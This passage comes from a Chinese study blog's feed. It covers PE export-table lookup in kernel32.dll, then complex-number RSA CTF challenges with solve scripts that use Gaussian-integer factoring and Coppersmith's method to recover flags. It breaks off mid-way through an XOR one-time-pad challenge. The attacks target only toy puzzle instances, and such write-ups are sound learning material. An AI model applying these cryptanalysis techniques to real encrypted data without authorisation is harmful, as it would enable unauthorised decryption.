确实是AddAtomw的字符串!</p><p>同样可以查到AddAtomW对应的ordinal&#x3D;2(对应数组第3个元素)<br>最后查找AddAtomW的实际函数地址<br>AddressOfFunctions: RAW:1A48 值 2654(RVA) -&gt; RAW:1A54<br>这是数组起始位置 我们已知ordinal为2 所以找第三个 对应地址1A5C 得到的值:0326D9(RVA)<br>这里的RVA是相对kernel32.dll的ImageBase的<br>在NT可选头查看ImageBase的值: 7C800000 所以 AddAtomW函数的VA值为RVA+IB &#x3D; 7C8326D9<br>在OD中查看验证(然而我用OD打开看不到这段的内存…)<br>用IDA打开一样 找到这个地址<br><img src="https://s2.loli.net/2023/12/04/sgUdRnqeV8HJ9Ic.png" alt="img"></p><p>可以看到确实就是AddAtomw函数的地址！！！</p><hr><p>第一遍看的时候只是过了一遍概念 没有跟着书上一起算RVA-&gt;RAW在winhex中来找对应值 也没有开OD来看<br>实操一遍收获还是挺多的 PE文件格式是重中之重！一定要反复看~！</p>]]></content>
      
      
      <categories>
          
          <category> ReverseEngineering </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Complex RSA</title>
      <link href="/Complex-RSA/"/>
      <url>/Complex-RSA/</url>
      
        <content type="html"><![CDATA[<p>复数RSA</p><span id="more"></span><p>在GeekGame2023遇到了复数RSA的概念 挺有意思的(orz) 记录一下</p><h2 id="复数域上的rsa-demo"><a href="#复数域上的rsa-demo" class="headerlink" title="复数域上的rsa demo"></a>复数域上的rsa demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,lcm,is_prime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">2047</span>)</span><br><span class="line"></span><br><span class="line">f = (<span class="number">378122348642214690905411683807377396279362526734068034297186493255873563264253248095197659138069664908850853277799239471404715546747080714581633876343291058815268009173602365587463522797812239900814474973941995698621021680129530453282192603316731832323767320307650941745085796583822798379896337325L</span>, <span class="number">205549984221850341303682190742446959375043769671555741781145106776498798455293849755553794941345135675348633855787880355726112506553703853175271830126908219803257875131387292937296039523359975622001865593227631119497003599166091642640101746534401068507972834895023584843991641629874709898672559632L</span>)</span><br><span class="line">e = <span class="number">59107</span></span><br><span class="line">p = <span class="number">228517792080140341</span></span><br><span class="line">q = <span class="number">1675909164550923263854591345270445396052847869117231939809062226222204253885693425526434134321712288675268468398852452684029376569327518089966506865838909486699078280423099271324646863671350838232140981094611254627738568184261530942469845202934677427234062382272736609418198352717</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cadd</span>(<span class="params">a,b,n</span>):</span><br><span class="line">    <span class="keyword">return</span> (a[<span class="number">0</span>]+b[<span class="number">0</span>]%n,a[<span class="number">1</span>]+b[<span class="number">1</span>]%n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmul</span>(<span class="params">a,b,n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a[<span class="number">0</span>]*b[<span class="number">0</span>]-a[<span class="number">1</span>]*b[<span class="number">1</span>])%n,(a[<span class="number">0</span>]*b[<span class="number">1</span>]+a[<span class="number">1</span>]*b[<span class="number">0</span>])%n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpow</span>(<span class="params">a,k,n</span>):</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">if</span>(k%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">        a=cmul(a,a,n)</span><br><span class="line">        <span class="keyword">return</span> cpow(a,k/<span class="number">2</span>,n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> cmul(a,cpow(cmul(a,a,n),(k-<span class="number">1</span>)/<span class="number">2</span>,n),n)</span><br><span class="line"></span><br><span class="line">o=lcm((p*p-<span class="number">1</span>),(q*q-<span class="number">1</span>))</span><br><span class="line">fm=cpow(f,invert(e,o),n)</span><br><span class="line"><span class="built_in">print</span>(fm)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>复数中的欧拉函数</p><ul><li>phi(p) &#x3D; p^2 - 1</li><li>phi(q) &#x3D; q^2 - 1</li><li>phi(n) &#x3D; phi(p) * phi(q)</li></ul><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="2023极客大挑战-EzComplex"><a href="#2023极客大挑战-EzComplex" class="headerlink" title="2023极客大挑战-EzComplex"></a>2023极客大挑战-EzComplex</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage9.3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;FAKE&#123;Do_You_know_Complex_numbers&#125;&#x27;</span></span><br><span class="line">p = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">q = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">N = <span class="built_in">pow</span>(p, <span class="number">2</span>) + <span class="built_in">pow</span>(q, <span class="number">2</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line"><span class="string">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>N &#x3D; p^2 + q^2 &#x3D; (p+qi) * (p-qi)<br>在复数域上分解N 遍历其因子就能得到p,q<br>一些sage用法说明:</p><ul><li>ZZ(i)[N]: 创建了一个整数高斯环</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">N = <span class="number">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line">zn = ZZ[i](N)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> divisors(zn):</span><br><span class="line">    p, q = <span class="built_in">int</span>(d[<span class="number">0</span>]), <span class="built_in">int</span>(d[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q) <span class="keyword">and</span> p.bit_length()&gt;<span class="number">300</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p= <span class="subst">&#123;p&#125;</span>\nq= <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">p= <span class="number">8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707</span></span><br><span class="line">q= <span class="number">29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">d = modinv(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="未知来源"><a href="#未知来源" class="headerlink" title="未知来源"></a>未知来源</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, totient</span><br><span class="line"><span class="comment"># where totient is a function used to calculate phi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>([self.re, self.im])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">msg, length</span>):</span><br><span class="line">    pad_length = length - <span class="built_in">len</span>(msg) - <span class="number">1</span></span><br><span class="line">    pad_data = os.urandom(pad_length)</span><br><span class="line">    <span class="keyword">return</span> msg + <span class="string">b&#x27;\x00&#x27;</span> + pad_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpad</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">return</span> msg.split(<span class="string">b&quot;\x00&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">bits = <span class="number">512</span></span><br><span class="line">p = getPrime(bits)</span><br><span class="line">q = getPrime(bits)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">sha_flag = hashlib.sha256(flag).digest()</span><br><span class="line"></span><br><span class="line">m1 = Complex(</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(sha_flag[:<span class="built_in">len</span>(sha_flag)//<span class="number">2</span>], <span class="string">&quot;big&quot;</span>),</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(sha_flag[<span class="built_in">len</span>(sha_flag)//<span class="number">2</span>:], <span class="string">&quot;big&quot;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">m2 = Complex(</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(pad(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>], bits//<span class="number">4</span>-<span class="number">1</span>), <span class="string">&quot;big&quot;</span>),</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(pad(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:], bits//<span class="number">4</span>-<span class="number">1</span>), <span class="string">&quot;big&quot;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">phi = totient(p, q)</span><br><span class="line">e = q * inverse(p, phi)</span><br><span class="line">c1 = complex_pow(m1, e, n)</span><br><span class="line">c2 = complex_pow(m2, e, n)</span><br><span class="line"></span><br><span class="line">c1.show()</span><br><span class="line">c2.show()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[90554536599623574119664951128649936419332926063696768860765928746438458550068553748440108394673303800443215316190882880737918820592384729010491685487061658710808286341751196450604089438847354206384322610922839055308138101241906861635339635907663440043442187064090630207952625897567214431195621589834131462698, 9144096375153318849308858335764188418198064372272913164911615933938183103747900881824918069830188301084043148828961577193063557255905230182831945580084452509300200269659063051152684191139872067872645370760797859584822240361290678189844670289832298393156571913616456958845361092243648857334156534377833472900]</span></span><br><span class="line"><span class="string">[62925714576233017213228404230949787334346543378320798964656732359587152905032848271156799538355748406136742979043729040728123730886381468564779041856310262770766050213464073568850702827835472680885186487027698395099598698463717279017013124488699475168052581476224742146967412904416266652605031934025266540003, 62818668456104375760667670741457826560706388018921820295286033114468271151921637926389738844622672202424650967678199715932465104135980734708459543588178208672956785650944371545080965650112025782049517299538052360417245732776384089052839997333049599655001615752078742624898059780909287845495731050387891926520]</span></span><br><span class="line"><span class="string">n = 94040393367054633265453751757391098049234338193258976478647369399924701067077628840760704857546243644552533845934146003988635403227234096447871132283820920489003286967145732739404245319615714787916756200564828237043658350145929927911058782352154997346295194977765305107634012698472977467843980475009837261877</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里计算p,q的phi是复数域上的计算方式:</p><ul><li>phi(p) &#x3D; p^2 - 1</li><li>phi(q) &#x3D; q^2 - 1</li><li>phi(n) &#x3D; phi(p) * phi(q)</li></ul><p><img src="https://s2.loli.net/2023/12/03/SetLslk9bdAMVp4.png" alt="img"></p><p>要时刻记住phi(x) &#x3D; x^2 - 1</p><p>然后 c1^n - m &#x3D; k1 * q<br>由于m为128bits 完全可以在modn下copper求出m!(更新了cooper的用法 以前只会用来单独求p,q 其实它找的是模n的一个因子的意义下为0的根 完全可以用来解kp,kq的情况)</p><p>这里我们要自己加一个返回实部虚部的函数 不然返回的是一个Complex对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>([self.re, self.im])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_value</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.re,self.im</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1 = [<span class="number">90554536599623574119664951128649936419332926063696768860765928746438458550068553748440108394673303800443215316190882880737918820592384729010491685487061658710808286341751196450604089438847354206384322610922839055308138101241906861635339635907663440043442187064090630207952625897567214431195621589834131462698</span>, <span class="number">9144096375153318849308858335764188418198064372272913164911615933938183103747900881824918069830188301084043148828961577193063557255905230182831945580084452509300200269659063051152684191139872067872645370760797859584822240361290678189844670289832298393156571913616456958845361092243648857334156534377833472900</span>]</span><br><span class="line">c2 = [<span class="number">62925714576233017213228404230949787334346543378320798964656732359587152905032848271156799538355748406136742979043729040728123730886381468564779041856310262770766050213464073568850702827835472680885186487027698395099598698463717279017013124488699475168052581476224742146967412904416266652605031934025266540003</span>, <span class="number">62818668456104375760667670741457826560706388018921820295286033114468271151921637926389738844622672202424650967678199715932465104135980734708459543588178208672956785650944371545080965650112025782049517299538052360417245732776384089052839997333049599655001615752078742624898059780909287845495731050387891926520</span>]</span><br><span class="line">n = <span class="number">94040393367054633265453751757391098049234338193258976478647369399924701067077628840760704857546243644552533845934146003988635403227234096447871132283820920489003286967145732739404245319615714787916756200564828237043658350145929927911058782352154997346295194977765305107634012698472977467843980475009837261877</span></span><br><span class="line"></span><br><span class="line">c1 = Complex(c1[<span class="number">0</span>],c1[<span class="number">1</span>])</span><br><span class="line">c2 = Complex(c2[<span class="number">0</span>],c2[<span class="number">1</span>])</span><br><span class="line">c1n = complex_pow(c1,n,n).get_value()</span><br><span class="line"></span><br><span class="line"><span class="comment"># PR.&lt;m1&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="comment"># f = c1n - m1</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line"><span class="comment"># m_1 = f.small_roots(X=2^128,beta=0.4)[0]</span></span><br><span class="line"><span class="comment"># q = gcd(c1n-m_1,n)</span></span><br><span class="line"><span class="comment"># p = n//q</span></span><br><span class="line"><span class="comment"># assert p*q == n</span></span><br><span class="line"><span class="comment"># print(f&#x27;p= &#123;p&#125;\nq= &#123;q&#125;&#x27;)</span></span><br><span class="line">q = <span class="number">7323077971059291689707065981399299595305255699400528762823657455799263529156562060157257164843406722707105788120169666250562251092133204672454047510142903</span></span><br><span class="line">p = <span class="number">12841648517017166445551091061211185386388830485650207877732791165106786665791893519935905079260599145467726270747052676462914579177741552378246815211750259</span></span><br><span class="line">phi = (p**<span class="number">2</span>-<span class="number">1</span>)*(q**<span class="number">2</span>-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">e = modinv(p,phi)*q%phi</span><br><span class="line">d = modinv(e,phi)</span><br><span class="line">m = complex_pow(c2,d,n).get_value()</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m[<span class="number">0</span>])),n2s(<span class="built_in">int</span>(m[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure><p>最后<strong>flag</strong>: flag{3ef6db06-b837-11ed-9825-00155dfcdef9}</p><p>总结一下:<br>关键知识点: 复数域下phi的不同<br>与常规RSA的结合: 都有 de&#x3D;kphi+1 都有coopersmith等攻击方法<br>通过这道题学习到复数RSA的同时 还更新了cooper求kp,kq！</p>]]></content>
      
      
      <categories>
          
          <category> CTF-Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023极客大挑战 Crpyto</title>
      <link href="/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Crpyto/"/>
      <url>/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Crpyto/</url>
      
        <content type="html"><![CDATA[<p>没参加比赛 跟着其他师傅的博客复现一下其中的一些题目</p><span id="more"></span><h2 id="OTPTwice"><a href="#OTPTwice" class="headerlink" title="OTPTwice"></a>OTPTwice</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># step0: key generation &amp; distribution</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s0</span>(<span class="params">msg</span>): </span><br><span class="line">    k1,k2 = [urandom(<span class="built_in">len</span>(msg)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">    <span class="keyword">return</span> k1,k2 </span><br><span class="line"></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: Alice encrypt M, and send it to Bob</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s1</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c1 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: Bob encrypt c1, and send it to Alice </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s2</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    c2 = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> c2 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: Alice decrypt c2, and send it to Bob.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s3</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c3 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c3 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step4: Bob decrypt c3, get M.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s4</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    m_ = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> m_ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg,k1,k2</span>): </span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">assert</span> msg == m_</span><br><span class="line"></span><br><span class="line"><span class="comment"># Here&#x27;s what hacker Eve got:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_</span>(<span class="params">msg,k1,k2</span>):</span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">if</span> HACK == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(c1) </span><br><span class="line">        <span class="built_in">print</span>(c2) </span><br><span class="line">        <span class="built_in">print</span>(c3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1,k2 = s0(flag) </span><br><span class="line">encrypt_(flag,k1,k2) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line"><span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>emmm 看着OTP我就记下来了 …<br>分析一下<br><code>c1 = msg xor k1</code><br><code>c2 = c1 xor k2</code><br><code>c3 = c2 xor k1</code><br>题目还贴心地告诉了我们 <code>_m = c3 xor k2 = 